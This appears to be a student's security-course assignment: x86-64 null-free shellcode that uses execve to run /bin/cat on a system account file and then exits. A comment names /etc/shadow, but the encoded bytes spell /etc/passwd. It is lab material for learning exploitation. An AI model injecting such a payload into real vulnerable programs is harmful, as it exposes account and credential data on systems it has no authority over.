# Maximiliano Brizzio
# I pledge my honor that I have abided by the Stevens Honor System.

	
	.global _start
	.text
_start:	
	
	xor %rdx, %rdx 	
	
	push $59
	pop %rax # Syscall No.	
	
	push %rdx
	mov $0x7461632f6e69622f, %rcx
	push %rcx
	mov %rsp, %rdi # Saving /bin/cat to register	
		
	push %rdx
	mov $0x6477737361702f63, %rcx
	push %rcx
	mov $0x74652f2f2f2f2f2f, %rcx
	push %rcx
	mov %rsp, %rcx # Saving /etc/shadow to register
	
	push %rdx
	push %rcx
	push %rdi
	mov %rsp, %rsi	# Retrieving pointer to stack containing argv
	syscall #execve()


	push $60
	pop %rax
	xor %rdi, %rdi
	syscall

